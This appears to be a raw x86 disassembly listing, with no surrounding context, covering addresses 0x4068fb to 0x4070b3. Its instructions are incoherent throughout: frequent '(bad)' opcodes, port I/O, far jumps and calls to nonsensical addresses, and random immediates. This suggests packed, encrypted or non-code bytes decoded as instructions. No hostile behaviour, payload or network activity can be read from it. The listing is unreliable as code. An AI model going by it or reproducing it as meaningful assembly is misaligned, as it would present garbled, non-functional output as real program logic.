  4068fb:	push   edx
  4068fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4068fd:	cdq    
  4068fe:	jp     0x40691e
  406900:	jmp    0xb103b9c9
  406905:	(bad)  
  406906:	cdq    
  406907:	push   ebp
  406908:	jg     0x406918
  40690a:	imul   esi,DWORD PTR [ebp-0xf7c0c47],0x675abc5e
  406914:	lock xlat BYTE PTR ds:[ebx]
  406916:	sti    
  406917:	mov    ds,WORD PTR [edi]
  406919:	and    al,al
  40691b:	(bad)  
  40691c:	xor    eax,0x5df1e7f4
  406921:	pop    edx
  406922:	xor    eax,0x4e6aa0c5
  406927:	push   cs
  406928:	adc    dl,BYTE PTR [edx+0x1e]
  40692b:	lods   eax,DWORD PTR ds:[esi]
  40692c:	cmp    bh,BYTE PTR [esi-0x28ae666b]
  406932:	dec    esp
  406933:	inc    edx
  406934:	jmp    0xe642:0x5166e7fc
  40693b:	sti    
  40693c:	and    BYTE PTR [edx-0x7ba81b68],dh
  406942:	push   ds
  406943:	lods   al,BYTE PTR ds:[esi]
  406944:	in     al,0xe3
  406946:	sbb    eax,0x9eba6381
  40694b:	fsub   QWORD PTR [esi+0x2b1475d5]
  406951:	jecxz  0x406970
  406953:	adc    DWORD PTR ds:0x8d40dc82,esi
  406959:	aaa    
  40695a:	lahf   
  40695b:	out    0x1f,al
  40695d:	(bad)  
  40695e:	out    dx,eax
  40695f:	mov    bh,0xef
  406961:	ficom  DWORD PTR [esi]
  406963:	mov    cl,0x5a
  406965:	test   DWORD PTR [ebx+0x49],eax
  406968:	mov    ebx,0x477d52a1
  40696d:	sub    al,BYTE PTR [ecx]
  40696f:	dec    edx
  406970:	fimul  WORD PTR [edx+eiz*1]
  406973:	pop    edi
  406974:	fsubr  DWORD PTR ds:0x4076
  406979:	xlat   BYTE PTR ds:[ebx]
  40697a:	sub    DWORD PTR [ecx-0x55065c1f],ebx
  406980:	pop    ds
  406981:	mov    ecx,0xce766333
  406986:	ja     0x406952
  406988:	or     ecx,DWORD PTR [eax]
  40698a:	leave  
  40698b:	mov    DWORD PTR [edx],esi
  40698d:	jecxz  0x4069c6
  40698f:	ins    DWORD PTR es:[edi],dx
  406990:	lea    eax,[ecx+0x47]
  406993:	add    eax,0xb818f6e4
  406998:	cmc    
  406999:	jmp    0x4069dc
  40699b:	and    ah,BYTE PTR [edx+edx*4+0x71]
  40699f:	mov    eax,ds:0x5f51f3f7
  4069a4:	aas    
  4069a5:	fcomp  st(7)
  4069a7:	das    
  4069a8:	inc    eax
  4069a9:	rep ins DWORD PTR es:[edi],dx
  4069ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4069ac:	jle    0x406941
  4069ae:	xor    DWORD PTR [ebx-0x510c926e],ecx
  4069b4:	or     DWORD PTR [ebx+0x6],eax
  4069b7:	(bad)  
  4069b8:	mov    ds:0x7b9d5952,eax
  4069bd:	jmp    0x4069fd
  4069bf:	xlat   BYTE PTR ds:[ebx]
  4069c0:	popa   
  4069c1:	jmp    0x4069f8
  4069c3:	rcr    DWORD PTR ds:0xeabc4499,1
  4069c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4069ca:	dec    ebp
  4069cb:	add    eax,0xad4dbd83
  4069d0:	int    0xf8
  4069d2:	sub    edi,DWORD PTR [ecx-0x37427e82]
  4069d8:	and    eax,DWORD PTR [bx+0x6077]
  4069dd:	mov    ch,dh
  4069df:	xchg   edx,eax
  4069e0:	jge    0x4069c2
  4069e2:	test   al,0x87
  4069e4:	and    BYTE PTR [ebx],0xc0
  4069e7:	pop    esi
  4069e8:	dec    ebx
  4069e9:	dec    ecx
  4069ea:	arpl   WORD PTR [edi],bp
  4069ec:	mov    BYTE PTR [edi+0x47],ah
  4069ef:	lods   al,BYTE PTR ds:[esi]
  4069f0:	pop    es
  4069f1:	pop    ebx
  4069f2:	sahf   
  4069f3:	shr    DWORD PTR [ebx],0x1f
  4069f6:	aas    
  4069f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4069f8:	dec    esi
  4069f9:	dec    ebx
  4069fa:	retf   
  4069fb:	in     eax,dx
  4069fc:	pop    edi
  4069fd:	or     al,0x77
  4069ff:	rcr    BYTE PTR [ebx-0x4f],cl
  406a02:	cmp    BYTE PTR [eax-0x4498e540],bh
  406a08:	push   0x6d
  406a0a:	pop    ebp
  406a0b:	cmp    BYTE PTR [edi-0x5d21a487],0x0
  406a12:	pop    edx
  406a13:	push   esp
  406a14:	inc    edi
  406a15:	sbb    esp,DWORD PTR [ebx]
  406a17:	stos   DWORD PTR es:[edi],eax
  406a18:	fwait
  406a19:	addr16 pop edi
  406a1b:	push   cs
  406a1c:	xor    esi,edx
  406a1e:	add    al,0x31
  406a20:	pop    es
  406a21:	rol    ebp,cl
  406a23:	or     al,0xe0
  406a25:	mov    ebx,DWORD PTR [ebx]
  406a27:	mul    BYTE PTR [eax-0x60]
  406a2a:	loopne 0x406a39
  406a2c:	mov    eax,ds:0x5354a30
  406a31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a32:	stc    
  406a33:	fnstcw WORD PTR [esi]
  406a35:	push   eax
  406a36:	es or  eax,0x3ceaea73
  406a3c:	fisttp DWORD PTR [ebp-0x35]
  406a3f:	xchg   DWORD PTR [eax-0x4d527dcf],edx
  406a45:	test   DWORD PTR [edi],esi
  406a47:	xchg   edi,eax
  406a48:	pop    es
  406a49:	xchg   esp,eax
  406a4a:	test   BYTE PTR [ebp+0x4b],0x3
  406a4e:	bound  ebp,QWORD PTR [edi+0x78]
  406a51:	fs mov esp,0x246b144b
  406a57:	jb     0x406a57
  406a59:	mov    ebp,0x4458727a
  406a5e:	or     eax,0x63f9de35
  406a63:	es add eax,0x34045207
  406a69:	rcr    DWORD PTR [edx+0x1827cec],0xac
  406a70:	mov    edi,0x7c3a932f
  406a75:	xor    edi,DWORD PTR [ebx+esi*8-0x15309a4b]
  406a7c:	sbb    DWORD PTR [esi],esi
  406a7e:	cmp    BYTE PTR [ebx+0x3a441f7f],dh
  406a84:	inc    ebx
  406a85:	add    DWORD PTR [eax],esp
  406a87:	or     DWORD PTR [ecx-0x60],ebp
  406a8a:	push   edx
  406a8b:	xor    edi,DWORD PTR [edi-0x4c29992f]
  406a91:	ficom  WORD PTR [ebp-0x33]
  406a94:	or     BYTE PTR [ebp+0x49a423d0],0x89
  406a9b:	pop    ebp
  406a9c:	inc    ebx
  406a9d:	sub    ebp,DWORD PTR ds:0x674fedfa
  406aa3:	add    BYTE PTR [esi],bh
  406aa5:	rol    DWORD PTR [ebx-0x16],1
  406aa8:	out    0x3e,eax
  406aaa:	dec    eax
  406aab:	xchg   ebp,eax
  406aac:	(bad)
  406ab0:	cmp    dl,BYTE PTR [ebx]
  406ab2:	push   es
  406ab3:	in     eax,0xb3
  406ab5:	xor    DWORD PTR [ebx],esp
  406ab7:	fnstenv [ecx]
  406ab9:	inc    ecx
  406aba:	sar    BYTE PTR [ebp+0xe],0x2f
  406abe:	xchg   DWORD PTR [ebx+0x64bb867e],esp
  406ac4:	mov    dl,0x0
  406ac6:	cld    
  406ac7:	push   edx
  406ac8:	out    0x55,eax
  406aca:	stos   BYTE PTR es:[edi],al
  406acb:	into   
  406acc:	cmp    eax,0xbb059a85
  406ad1:	(bad)  
  406ad2:	in     al,0xef
  406ad4:	arpl   WORD PTR [edi+ebx*8],sp
  406ad7:	es pop DWORD PTR gs:[edx-0x7f]
  406adc:	jae    0x406b4f
  406ade:	clc    
  406adf:	test   BYTE PTR [eax-0x2ccd4906],0x29
  406ae6:	xchg   DWORD PTR [ebx-0x22fb274f],eax
  406aec:	imul   edx,DWORD PTR [eax+0x794eb8c6],0xffffffdd
  406af3:	mov    bh,0x35
  406af5:	add    eax,0x983a435
  406afa:	lods   al,BYTE PTR ds:[esi]
  406afb:	(bad)  
  406afc:	push   cs
  406afd:	xor    DWORD PTR [ebx+0x58],esp
  406b00:	fdiv   QWORD PTR [edx+0x3b]
  406b03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b04:	push   ebp
  406b05:	jnp    0x406b5d
  406b07:	lea    esp,[ecx-0x5ae88a6e]
  406b0d:	pop    eax
  406b0e:	mov    eax,ds:0xeb1e767d
  406b13:	bnd call 0xdeb45705
  406b19:	loop   0x406af9
  406b1b:	fisttp DWORD PTR [esi-0x45]
  406b1e:	push   edi
  406b1f:	xchg   edx,eax
  406b20:	stos   DWORD PTR es:[edi],eax
  406b21:	and    esp,esi
  406b23:	inc    esp
  406b24:	imul   esi,DWORD PTR [esi],0x54
  406b27:	fbld   TBYTE PTR [ecx]
  406b29:	clc    
  406b2a:	not    bh
  406b2c:	inc    ebp
  406b2d:	leave  
  406b2e:	ret    
  406b2f:	xchg   esp,eax
  406b30:	push   ecx
  406b31:	shl    BYTE PTR [esi+edx*4],0xe8
  406b35:	cmp    BYTE PTR [edi],0xac
  406b38:	xchg   BYTE PTR [ebx+eax*2],ah
  406b3b:	cmp    eax,edi
  406b3d:	(bad)  
  406b3e:	xor    ah,BYTE PTR [edi+0x49dbc0ed]
  406b44:	pop    eax
  406b45:	push   eax
  406b46:	inc    edx
  406b47:	inc    esp
  406b48:	rol    DWORD PTR [edx-0x27],cl
  406b4b:	mov    dh,BYTE PTR [edx-0x48]
  406b4e:	into   
  406b4f:	sub    bl,0xc1
  406b52:	adc    eax,0xa888229c
  406b57:	push   ss
  406b58:	jmp    FWORD PTR [edx]
  406b5a:	inc    edx
  406b5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b5c:	je     0x406bcf
  406b5e:	adc    bl,BYTE PTR [ebx-0x57]
  406b61:	outs   dx,BYTE PTR ds:[esi]
  406b62:	repnz push ecx
  406b64:	inc    ebp
  406b65:	push   edx
  406b66:	and    al,0xd4
  406b68:	jo     0x406bb6
  406b6a:	(bad)  
  406b6b:	in     al,0x4f
  406b6d:	sbb    BYTE PTR [edx-0x311ac2a8],al
  406b73:	dec    ebp
  406b74:	out    dx,al
  406b75:	ror    DWORD PTR [esp+eax*8+0x4b44626b],0xde
  406b7d:	add    al,0x3b
  406b7f:	xor    DWORD PTR [esi],0x14
  406b82:	and    esi,DWORD PTR [edx]
  406b84:	add    DWORD PTR ss:[edi],ecx
  406b87:	bound  esi,QWORD PTR [ebp+0x1940fceb]
  406b8d:	sub    eax,0xd80e709d
  406b92:	xlat   BYTE PTR ds:[ebx]
  406b93:	or     al,0x14
  406b95:	inc    edx
  406b96:	ror    BYTE PTR [eax-0x50],1
  406b99:	in     al,0x85
  406b9b:	push   cs
  406b9c:	shl    BYTE PTR [eax+esi*1+0x1c],cl
  406ba0:	jmp    0x2041:0x4a4bd96f
  406ba7:	jmp    0xe4cf:0x3c5babbf
  406bae:	test   BYTE PTR [eax+eiz*8],0xa3
  406bb2:	inc    eax
  406bb3:	xor    ch,BYTE PTR ds:0xba44e4be
  406bb9:	xchg   ebx,eax
  406bba:	dec    edi
  406bbb:	test   eax,0xa352717e
  406bc0:	jecxz  0x406c36
  406bc2:	or     ah,BYTE PTR [edi]
  406bc4:	clc    
  406bc5:	adc    eax,0x22cfeb18
  406bca:	jbe    0x406be2
  406bcc:	pop    ebp
  406bcd:	jne    0x406c34
  406bcf:	shl    BYTE PTR [eax+esi*8-0x63b6d8c8],0x30
  406bd7:	shl    ebp,0x26
  406bda:	rcr    DWORD PTR [ebp-0x2c],cl
  406bdd:	jo     0x406ba4
  406bdf:	arpl   WORD PTR [ecx+ebx*2],si
  406be2:	jbe    0x406b6e
  406be4:	lods   al,BYTE PTR ds:[esi]
  406be5:	repz jmp 0xfc1d8ffa
  406beb:	pop    edi
  406bec:	es cmp eax,edi
  406bef:	push   0xffffffb5
  406bf1:	xor    ch,cl
  406bf3:	loopne 0x406bd4
  406bf5:	arpl   WORD PTR [edi+0x72],dx
  406bf8:	jo     0x406c2c
  406bfa:	imul   esi,DWORD PTR [ecx+0x73],0xffffffd2
  406bfe:	call   0x530a:0x3c71b413
  406c05:	ds push edx
  406c07:	fcmovnbe st,st(3)
  406c09:	call   0x8a8a:0x501bae43
  406c10:	mov    BYTE PTR [edi-0x47c619c7],ch
  406c16:	cwde   
  406c17:	jg     0x406bb3
  406c19:	ficomp DWORD PTR [ecx]
  406c1b:	das    
  406c1c:	pusha  
  406c1d:	or     eax,0x9a663f4a
  406c22:	push   eax
  406c23:	xchg   ebp,eax
  406c24:	data16 aaa 
  406c26:	xor    ch,ah
  406c28:	sbb    esp,DWORD PTR [edi-0x1e6205ac]
  406c2e:	mov    dh,BYTE PTR [ebx+edx*8+0x39]
  406c32:	stos   DWORD PTR es:[edi],eax
  406c33:	or     BYTE PTR [edi-0x29898fa8],al
  406c39:	dec    ecx
  406c3a:	pop    es
  406c3b:	ror    esp,0x81
  406c3e:	sbb    cl,BYTE PTR [ebp-0x5c7bf187]
  406c44:	arpl   WORD PTR ds:0x4bb8e727,cx
  406c4a:	dec    esi
  406c4b:	lods   al,BYTE PTR ds:[esi]
  406c4c:	jbe    0x406c47
  406c4e:	or     eax,0xa8c5c9e0
  406c53:	sub    eax,0x11ce076c
  406c58:	outs   dx,DWORD PTR fs:[esi]
  406c5a:	pop    ss
  406c5b:	iret   
  406c5c:	mov    al,ds:0x1157adf5
  406c61:	cmp    al,0x87
  406c63:	stos   DWORD PTR es:[edi],eax
  406c64:	jo     0x406c6e
  406c66:	pop    ss
  406c67:	adc    dh,BYTE PTR [ebp-0x44]
  406c6a:	aas    
  406c6b:	pop    ecx
  406c6c:	jno    0x406cb3
  406c6e:	xchg   ebx,eax
  406c6f:	dec    ebx
  406c70:	dec    ecx
  406c71:	mov    edi,0xfedf3eec
  406c76:	mov    ebp,0x6649c0e0
  406c7b:	mov    ebx,0xaa1b84f9
  406c80:	call   0xe473a03b
  406c85:	inc    esp
  406c86:	dec    ebp
  406c87:	daa    
  406c88:	cmp    esi,ecx
  406c8a:	cld    
  406c8b:	jp     0x406c43
  406c8d:	lahf   
  406c8e:	mov    ds,WORD PTR [eax+0x30]
  406c91:	data16 sub cl,BYTE PTR [eax+0x27]
  406c95:	ja     0x406c2c
  406c97:	jmp    0x5032:0x22e0ef95
  406c9e:	(bad)  
  406ca0:	pop    esp
  406ca1:	loop   0x406cfe
  406ca3:	push   0x4a2ac29
  406ca8:	jl     0x406c68
  406caa:	ja     0x406d1c
  406cac:	(bad)  [edi+edx*8]
  406caf:	inc    edi
  406cb0:	sbb    eax,0x2c1f3bd5
  406cb5:	pop    ebx
  406cb6:	add    DWORD PTR [eax-0x66de3421],ebp
  406cbc:	pop    ebx
  406cbd:	mov    ebx,0xd03f343a
  406cc2:	cwde   
  406cc3:	aas    
  406cc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406cc5:	lds    esp,FWORD PTR [esi-0x4c]
  406cc8:	xlat   BYTE PTR ds:[ebx]
  406cc9:	popf   
  406cca:	sbb    ecx,DWORD PTR [ecx*4+0x603532ac]
  406cd1:	xchg   edx,esi
  406cd3:	mov    ds:0x55a7da5d,eax
  406cd8:	jbe    0x406d1b
  406cda:	pop    ds
  406cdb:	or     esi,ecx
  406cdd:	cmp    DWORD PTR [edi],0xf05ded37
  406ce3:	push   0xedd1eeac
  406ce8:	sub    BYTE PTR [ecx-0x52],bh
  406ceb:	dec    esi
  406cec:	std    
  406ced:	or     ebp,ecx
  406cef:	ins    BYTE PTR es:[edi],dx
  406cf0:	inc    dx
  406cf2:	mov    al,0xa2
  406cf4:	adc    ebp,DWORD PTR [esi-0x60]
  406cf7:	scas   al,BYTE PTR es:[edi]
  406cf8:	push   0x1ca6bc43
  406cfd:	lahf   
  406cfe:	fsub   QWORD PTR [edi]
  406d00:	mov    bh,BYTE PTR [ecx-0x4dcaa879]
  406d06:	outs   dx,DWORD PTR ds:[esi]
  406d07:	push   edx
  406d08:	push   edx
  406d09:	adc    al,BYTE PTR [edi+edi*1+0x3]
  406d0d:	scas   eax,DWORD PTR es:[edi]
  406d0e:	cmc    
  406d0f:	std    
  406d10:	adc    dl,BYTE PTR [ebp+0x72]
  406d13:	cmp    BYTE PTR [esi+0x320ab9f4],ah
  406d19:	push   ebp
  406d1a:	(bad)  
  406d1b:	pop    esi
  406d1c:	cwde   
  406d1d:	arpl   WORD PTR [eax],bp
  406d1f:	inc    ebp
  406d20:	add    ecx,DWORD PTR [edi-0x6c59a62c]
  406d26:	pop    ds
  406d27:	nop
  406d28:	aam    0x40
  406d2a:	and    eax,0xe68114fe
  406d2f:	adc    al,ch
  406d31:	sub    ebp,esi
  406d33:	mov    DWORD PTR [ebp+0x57],edx
  406d36:	int    0x1c
  406d38:	pop    ds
  406d39:	sbb    al,0x92
  406d3b:	cmc    
  406d3c:	mov    bl,dl
  406d3e:	push   ecx
  406d3f:	imul   esi,DWORD PTR [ebx],0xffffff8f
  406d42:	loop   0x406d14
  406d44:	add    esp,DWORD PTR [eax]
  406d46:	js     0x406dad
  406d48:	sub    al,0x49
  406d4a:	xor    eax,0x8157f27f
  406d4f:	mov    ebp,0xacd43600
  406d54:	or     dh,ah
  406d56:	adc    BYTE PTR [ecx],bl
  406d58:	aas    
  406d59:	retf   0x67e6
  406d5c:	mov    eax,0xa9df3c54
  406d61:	rol    BYTE PTR [eax-0x249d13c4],cl
  406d67:	pop    ds
  406d68:	or     eax,0x40c2845c
  406d6d:	sub    esi,edi
  406d6f:	dec    eax
  406d70:	(bad)  
  406d71:	sbb    edi,DWORD PTR [ecx]
  406d73:	cmp    edi,edi
  406d75:	add    BYTE PTR [edi+0x2c7c2ea4],ch
  406d7b:	scas   al,BYTE PTR es:[edi]
  406d7c:	add    esi,DWORD PTR [eax-0x5bc316b6]
  406d82:	test   eax,0xa8711adc
  406d87:	leave  
  406d88:	cwde   
  406d89:	push   ss
  406d8a:	daa    
  406d8b:	icebp  
  406d8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d8d:	jl     0x406d6f
  406d8f:	mov    ds:0xc1bdbd42,eax
  406d94:	mov    WORD PTR [edi-0x7975f5cf],?
  406d9a:	pop    ds
  406d9b:	add    bl,ah
  406d9d:	or     eax,0xcc684c93
  406da2:	std    
  406da3:	inc    ebx
  406da4:	mov    DWORD PTR [ebx],ebx
  406da6:	loopne 0x406d2d
  406da8:	bound  edx,QWORD PTR [eax]
  406daa:	cmp    BYTE PTR [esi+0x3b],ch
  406dad:	(bad)  
  406dae:	std    
  406daf:	xchg   ebx,eax
  406db0:	xor    DWORD PTR [ebx+0x51],ecx
  406db3:	(bad)  
  406db4:	pushf  
  406db5:	or     eax,0xb45f7fd3
  406dba:	mov    bh,BYTE PTR [edx]
  406dbc:	out    dx,eax
  406dbd:	loop   0x406e34
  406dbf:	es mov ah,0xb8
  406dc2:	mov    bh,0x2e
  406dc4:	(bad)  
  406dc5:	sbb    eax,0x9b0a206a
  406dca:	ret    
  406dcb:	sub    DWORD PTR [ebx-0x10],ebx
  406dce:	lock push ebp
  406dd0:	dec    esi
  406dd1:	mov    ds:0x638948ef,al
  406dd6:	xchg   ebp,eax
  406dd7:	jmp    0x5c7f52f3
  406ddc:	retf   
  406ddd:	neg    DWORD PTR [esi]
  406ddf:	push   0x1654bf56
  406de4:	int3   
  406de5:	cli    
  406de6:	lea    ebx,[ebp+0x17]
  406de9:	outs   dx,BYTE PTR ds:[esi]
  406dea:	sbb    ah,bl
  406dec:	sub    al,BYTE PTR [ecx]
  406dee:	icebp  
  406def:	sar    BYTE PTR [eax+0x78],1
  406df2:	sub    BYTE PTR [ebp-0x3e960743],ch
  406df8:	(bad)  
  406df9:	pushf  
  406dfa:	call   0x6d176b40
  406dff:	je     0x406e17
  406e01:	and    eax,esp
  406e03:	in     al,0x9
  406e05:	jno    0x406db1
  406e07:	std    
  406e08:	stc    
  406e09:	push   ds
  406e0a:	dec    eax
  406e0b:	adc    esi,DWORD PTR [ebx]
  406e0d:	jb     0x406e6e
  406e0f:	jmp    DWORD PTR [ebp+0x3c]
  406e12:	lahf   
  406e13:	cmp    bh,BYTE PTR [ebx+0x6b5abdd5]
  406e19:	fstp   st(4)
  406e1b:	pop    ebx
  406e1c:	cmp    eax,0x1651731e
  406e21:	push   esp
  406e22:	sub    al,0xc
  406e24:	gs add eax,0xf2fdd2be
  406e2a:	pop    edx
  406e2b:	outs   dx,BYTE PTR ds:[esi]
  406e2c:	pop    ebx
  406e2d:	int3   
  406e2e:	adc    eax,0x423294e3
  406e33:	inc    edx
  406e34:	mov    ebx,0xb2f545b2
  406e39:	fstp   TBYTE PTR [eax-0x2f9a6311]
  406e3f:	dec    ebp
  406e40:	inc    ebp
  406e41:	add    al,BYTE PTR [edi]
  406e43:	idiv   BYTE PTR [esi+0x7d]
  406e46:	sbb    eax,0x89f2be1
  406e4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e4c:	pop    ebp
  406e4d:	inc    edx
  406e4e:	fwait
  406e4f:	cmp    al,0x30
  406e51:	dec    eax
  406e52:	push   0xfffffff0
  406e54:	mov    edx,0x762ab476
  406e59:	or     eax,0xbdc51ffe
  406e5e:	jge    0x406eaf
  406e60:	cmp    eax,0xcd95dd96
  406e65:	sub    dh,BYTE PTR [ecx-0x5f]
  406e68:	adc    esi,DWORD PTR [esi]
  406e6a:	push   0xd92e88aa
  406e6f:	mov    ch,0xc
  406e71:	jns    0x406e26
  406e73:	pop    es
  406e74:	pop    esp
  406e75:	mov    cl,0xb8
  406e77:	(bad)  
  406e78:	loope  0x406ece
  406e7a:	loopne 0x406e15
  406e7c:	fisubr WORD PTR [ecx-0x40]
  406e7f:	mov    ch,0xac
  406e81:	lahf   
  406e82:	and    edx,DWORD PTR [ecx-0x6c]
  406e85:	push   edx
  406e86:	jl     0x406e82
  406e88:	retf   0xb014
  406e8b:	or     eax,0x3203cb49
  406e90:	xor    ebp,esi
  406e92:	add    al,0x76
  406e94:	mov    eax,ds:0x5d8de076
  406e99:	es (bad) 
  406e9c:	push   0xe90eff35
  406ea1:	fcom   DWORD PTR [ecx]
  406ea3:	imul   eax,DWORD PTR [edi],0x7e
  406ea6:	mov    dh,0xb9
  406ea8:	inc    ecx
  406ea9:	in     eax,0xb6
  406eab:	cmp    al,0x77
  406ead:	lods   al,BYTE PTR ds:[esi]
  406eae:	jnp    0x406ef0
  406eb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406eb1:	sub    DWORD PTR [ebx+0x32],ecx
  406eb4:	adc    BYTE PTR [edi+0x6cae2aa4],al
  406eba:	jle    0x406ea9
  406ebc:	lahf   
  406ebd:	das    
  406ebe:	push   0xffffffd3
  406ec0:	dec    esi
  406ec1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ec2:	adc    DWORD PTR [ebx-0x4d],edi
  406ec5:	str    WORD PTR [ecx+ebx*4+0xd]
  406eca:	neg    DWORD PTR [esi]
  406ecc:	mul    BYTE PTR [edi-0x2bcd134b]
  406ed2:	es out dx,eax
  406ed4:	xor    eax,0xa6211efa
  406ed9:	pop    ds
  406eda:	nop
  406edb:	faddp  st(6),st
  406edd:	mov    eax,ds:0xa976edc6
  406ee2:	in     al,0x1e
  406ee4:	out    0x4f,al
  406ee6:	(bad)  
  406ee7:	pop    edx
  406ee8:	out    dx,eax
  406ee9:	jbe    0x406eb9
  406eeb:	adc    bl,BYTE PTR [edi-0x73ff266f]
  406ef1:	push   0xe50fd201
  406ef6:	sub    BYTE PTR [eax+0x77],ch
  406ef9:	inc    esp
  406efa:	mov    edx,0x46b527bc
  406eff:	sbb    eax,0xefd6224a
  406f04:	ret    0x4ab9
  406f07:	aaa    
  406f08:	stc    
  406f09:	adc    BYTE PTR [eax+0x35],cl
  406f0c:	cli    
  406f0d:	sub    al,bl
  406f0f:	mov    ebx,0x875e3386
  406f14:	and    ch,ch
  406f16:	pop    edi
  406f17:	fidivr DWORD PTR [esi+edx*2-0x48fdf2a8]
  406f1e:	dec    edi
  406f1f:	test   al,0x7
  406f21:	lea    esi,[esi+0x45]
  406f24:	leave  
  406f25:	inc    eax
  406f26:	jecxz  0x406eff
  406f28:	add    edi,DWORD PTR [ecx+eax*4+0x60]
  406f2c:	fstp   TBYTE PTR [esi+0x57]
  406f2f:	enter  0xd9fc,0xe0
  406f33:	cmp    al,0x4c
  406f35:	pushf  
  406f36:	retf   0x5297
  406f39:	sar    BYTE PTR [edi-0x5064e85f],0x53
  406f40:	jo     0x406ee6
  406f42:	inc    ebp
  406f43:	jge    0x406eeb
  406f45:	stos   BYTE PTR es:[edi],al
  406f46:	mov    al,ds:0xf43a833
  406f4b:	sub    eax,edi
  406f4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f4e:	mov    ebp,0x806e39c4
  406f53:	push   ecx
  406f54:	push   ecx
  406f55:	pushf  
  406f56:	mov    edi,0xfb0e0b36
  406f5b:	stos   BYTE PTR es:[edi],al
  406f5c:	push   edx
  406f5d:	and    al,bh
  406f5f:	fsubr  DWORD PTR [ebx]
  406f61:	jmp    0x406f28
  406f63:	push   0x2e
  406f65:	data16 jecxz 0x406fa5
  406f68:	push   edx
  406f69:	pop    edi
  406f6a:	xchg   edx,eax
  406f6b:	sub    al,0x23
  406f6d:	aam    0x67
  406f6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f70:	pop    edx
  406f71:	push   ebp
  406f72:	sbb    DWORD PTR [eax-0x3c],edx
  406f75:	sahf   
  406f76:	adc    eax,0xf981c3f0
  406f7b:	jmp    0x60632eaa
  406f80:	mov    dh,0xf6
  406f82:	std    
  406f83:	in     eax,dx
  406f84:	dec    ebp
  406f85:	mov    esp,0x744f3f7f
  406f8a:	das    
  406f8b:	push   ebx
  406f8c:	or     edx,edi
  406f8e:	retf   0xf833
  406f91:	loope  0x406f8a
  406f93:	sub    DWORD PTR [esi-0x4e51bd0c],esi
  406f99:	pop    esp
  406f9a:	icebp  
  406f9b:	pop    edi
  406f9c:	xchg   ebp,eax
  406f9d:	mov    ebx,ds
  406f9f:	xchg   dh,ah
  406fa1:	clc    
  406fa2:	jb     0x407017
  406fa4:	push   esp
  406fa5:	xor    edx,DWORD PTR [ecx+0x4a21c92a]
  406fab:	aam    0xfe
  406fad:	imul   edx,DWORD PTR [ecx+0x3f5b8d19],0x44e9f97c
  406fb7:	es leave 
  406fb9:	jno    0x407038
  406fbb:	mov    ebp,0x48c466c
  406fc0:	ret    
  406fc1:	cmp    eax,0x8ed3025b
  406fc6:	adc    ebp,DWORD PTR [edx-0x67937fb5]
  406fcc:	mov    edx,0xb32b0ce1
  406fd1:	push   esp
  406fd2:	je     0x406f9e
  406fd4:	lods   eax,DWORD PTR ds:[esi]
  406fd5:	xchg   ecx,eax
  406fd6:	sbb    DWORD PTR [ebx+edi*4],ebx
  406fd9:	loop   0x406fde
  406fdb:	xchg   ebp,eax
  406fdc:	in     eax,dx
  406fdd:	pop    esi
  406fde:	xchg   esi,eax
  406fdf:	into   
  406fe0:	(bad)  
  406fe1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406fe2:	xchg   esi,eax
  406fe3:	bound  ecx,QWORD PTR [ebx]
  406fe5:	cmp    eax,0x8a6f0397
  406fea:	clc    
  406feb:	arpl   WORD PTR [esi],cx
  406fed:	jne    0x40704d
  406fef:	loope  0x407056
  406ff1:	cwde   
  406ff2:	xchg   esi,eax
  406ff3:	mov    DWORD PTR [ebp-0x33b01e1b],esi
  406ff9:	lock pop ebp
  406ffb:	loop   0x406fb8
  406ffd:	jge    0x407056
  406fff:	pushf  
  407000:	das    
  407001:	mov    ecx,0x67a92fe7
  407006:	adc    BYTE PTR [esi+edi*4-0x5ca0918e],dl
  40700d:	enter  0xec6b,0x66
  407011:	mov    eax,0x3a06224
  407016:	jmp    0x8740:0x4e25cd68
  40701d:	ins    DWORD PTR es:[edi],dx
  40701e:	jae    0x40709a
  407020:	enter  0xea96,0xe2
  407024:	pushf  
  407025:	jnp    0x40701d
  407027:	xor    esi,ebp
  407029:	jge    0x407017
  40702b:	repnz and al,0x75
  40702e:	out    dx,al
  40702f:	xchg   esi,eax
  407030:	nop
  407031:	popf   
  407032:	and    cl,BYTE PTR [ecx-0x117fa369]
  407038:	loopne 0x40701d
  40703a:	push   eax
  40703b:	adc    BYTE PTR [esi-0x33a9a57a],ch
  407041:	call   0xe0ab:0x87c1e2c5
  407048:	and    al,0x89
  40704a:	scas   eax,DWORD PTR es:[edi]
  40704b:	mov    edi,0x12b19d82
  407050:	inc    edx
  407051:	jo     0x406fdb
  407053:	push   cs
  407054:	jecxz  0x406ffc
  407056:	adc    bh,cl
  407058:	inc    ebp
  407059:	ret    0xbae1
  40705c:	jle    0xb078ce36
  407062:	pusha  
  407063:	jge    0x407024
  407065:	mov    edx,0x91b3091b
  40706a:	cmp    eax,0xdd115229
  40706f:	adc    ebx,DWORD PTR [ebx+0x246262ce]
  407075:	mov    ds:0x3145fe48,al
  40707a:	jge    0x4070c2
  40707c:	das    
  40707d:	jmp    0x407026
  40707f:	test   BYTE PTR [esi],0x87
  407082:	aas    
  407083:	or     eax,0x4d0aebda
  407088:	sub    eax,0xaa82906a
  40708d:	push   0x7a
  40708f:	sbb    DWORD PTR [edi],0xeec3a56d
  407095:	push   ss
  407096:	xchg   esi,eax
  407097:	push   edi
  407098:	push   ds
  407099:	adc    eax,0xc52ed0cb
  40709e:	xchg   ecx,eax
  40709f:	jmp    0x1efb9703
  4070a4:	pop    ebp
  4070a5:	arpl   WORD PTR [ebx+0x51c20be3],si
  4070ab:	loopne 0x4070e7
  4070ad:	sub    BYTE PTR [esi+0x39],bl
  4070b0:	inc    esp
  4070b1:	int    0x6b
  4070b3:	inc    ebp
